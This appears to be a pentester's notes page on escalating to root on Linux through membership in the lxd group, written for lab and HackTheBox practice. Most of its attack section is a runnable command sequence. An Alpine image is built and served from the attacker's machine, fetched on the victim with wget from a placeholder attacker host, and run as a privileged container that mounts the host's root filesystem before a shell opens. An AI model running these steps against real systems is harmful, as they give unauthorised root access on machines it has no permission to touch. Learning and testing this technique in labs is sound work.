---
title: lxd 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - privilege escalation
  - linux
  - lxd
---

# lxd

LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.

A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.

[Source: https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/). In this article, you can find a good explanation about how lxc works. [Original source: https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071](https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071).

## Privileges escalation

Privilege escalation through lxd requires the access of local account and that that local account belongs to the group lxd.

In order to take escalate the root privilege of the host machine you have to create an imag for lxd thus you need to perform the following the action:

**Steps to be performed on the attacker machine:**


```bash
# Download build-alpine in your local machine through the git repository:
git clone https://github.com/saghul/lxd-alpine-builder.git

# Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
cd lxd-alpine-builder
sudo ./build-alpine

# This will generate a tar file that you need to transfer to the victim machine. For that you can copy that file to your /var/www/html folder and start apache2 service.
```

**Steps to be performed on the victim machine:**

```bash
# Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:
wget http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz

# After the image is built it can be added as an image to LXD as follows:
lxc image import ./alpine-v3.17-x86_64-20230508_0532.tar.gz --alias myimage

# List available images:
lxc image list

# Initiate your image inside a new container
lxc init myimage ignite -c security.privileged=true

# Mount the container inside the /root directory
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Initialize the container
lxc start ignite

# Launch a shell command in the container
lxc exec ignite /bin/sh
```


## Related labs

[HackTheBox machine Included](htb-included.md).

